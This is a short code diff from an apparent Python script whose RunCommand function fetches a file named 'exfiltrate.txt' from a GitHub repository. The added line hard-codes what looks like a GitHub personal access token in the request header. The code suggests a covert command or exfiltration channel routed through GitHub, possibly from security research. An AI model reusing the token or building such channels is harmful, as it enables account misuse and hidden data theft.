@@ -32,7 +32,7 @@ def RunCommand():
     url = "https://api.github.com/repos/androne23/this_is_fine_wuzzi/contents/exfiltrate.txt"
     headers = {
     'Accept': 'application/vnd.github+json',
-    'Authorization': 'Bearer ',
+    'Authorization': 'Bearer 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',
     }
 
     response = requests.request("GET", url, headers=headers, proxies=proxies)
